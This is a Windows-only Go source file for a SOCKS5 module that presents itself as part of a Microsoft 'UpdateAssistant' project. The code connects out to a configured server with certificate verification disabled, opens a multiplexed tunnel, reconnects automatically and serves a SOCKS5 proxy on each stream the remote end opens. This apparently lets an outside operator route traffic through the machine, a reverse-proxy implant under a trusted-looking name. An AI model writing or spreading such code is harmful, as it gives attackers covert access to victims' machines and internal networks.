//go:build windows

package socks5

import (
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	gosocks5 "github.com/armon/go-socks5"
	"github.com/hashicorp/yamux"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	mu      sync.Mutex
	session *yamux.Session
	running bool
)

func Start() {
	mu.Lock()
	defer mu.Unlock()
	if running {
		logger.Info("[socks5] already running")
		return
	}
	running = true
	logger.Info("[socks5] started")
	go connectTunnel()
}

func Stop() {
	mu.Lock()
	defer mu.Unlock()
	running = false
	if session != nil {
		session.Close()
		session = nil
	}
	logger.Info("[socks5] stopped")
}

func connectTunnel() {
	addr := config.Addr()
	if addr == "" {
		logger.Error("[socks5] no server addr")
		return
	}

	host := addr
	for _, prefix := range []string{"wss://", "ws://"} {
		if len(addr) > len(prefix) && addr[:len(prefix)] == prefix {
			host = addr[len(prefix):]
			break
		}
	}
	tunnelURL := fmt.Sprintf("https://%s/tunnel", host)
	logger.Info("[socks5] connecting tunnel to %s", tunnelURL)

	req, err := http.NewRequest("GET", tunnelURL, nil)
	if err != nil {
		logger.Error("[socks5] tunnel request failed: %v", err)
		return
	}
	req.Header.Set("Authorization", "Bearer "+config.Key())
	req.Header.Set("Connection", "Upgrade")
	req.Header.Set("Upgrade", "tunnel")

	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	tcpConn, err := tls.Dial("tcp", host, tlsCfg)
	if err != nil {
		logger.Error("[socks5] tunnel tcp dial failed: %v", err)
		return
	}
	if err := req.Write(tcpConn); err != nil {
		logger.Error("[socks5] tunnel request write failed: %v", err)
		tcpConn.Close()
		return
	}

	buf := make([]byte, 1)
	var response []byte
	for {
		n, err := tcpConn.Read(buf)
		if err != nil || n == 0 {
			logger.Error("[socks5] tunnel response failed: %v", err)
			tcpConn.Close()
			return
		}
		response = append(response, buf[0])
		if len(response) >= 4 && string(response[len(response)-4:]) == "\r\n\r\n" {
			break
		}
	}
	if len(response) < 12 || string(response[:12]) != "HTTP/1.1 101" {
		logger.Error("[socks5] tunnel bad response: %s", string(response))
		tcpConn.Close()
		return
	}

	logger.Info("[socks5] tunnel connected")

	cfg := yamux.DefaultConfig()
	cfg.LogOutput = io.Discard
	sess, err := yamux.Client(tcpConn, cfg)
	if err != nil {
		logger.Error("[socks5] yamux client failed: %v", err)
		tcpConn.Close()
		return
	}

	mu.Lock()
	session = sess
	mu.Unlock()

	for {
		stream, err := sess.Accept()
		if err != nil {
			logger.Info("[socks5] session closed: %v", err)
			mu.Lock()
			shouldReconnect := running && session == sess
			if session == sess {
				session = nil
			}
			mu.Unlock()
			if shouldReconnect {
				logger.Info("[socks5] reconnecting in 2s...")
				time.Sleep(2 * time.Second)
				go connectTunnel()
			}
			return
		}
		go handleStream(stream)
	}
}

func isBoring(s string) bool {
	return s == "EOF" ||
		len(s) > 20 && (s[len(s)-20:] == "use of closed network connection" ||
			s[len(s)-18:] == "connection reset by peer")
}

func handleStream(stream net.Conn) {
	defer stream.Close()

	conf := &gosocks5.Config{}
	srv, err := gosocks5.New(conf)
	if err != nil {
		logger.Error("[socks5] socks5 server create failed: %v", err)
		return
	}

	if err := srv.ServeConn(stream); err != nil {
		// Only log real errors, not routine closures
		if !isBoring(err.Error()) {
			logger.Info("[socks5] stream err: %v", err)
		}
	}
}
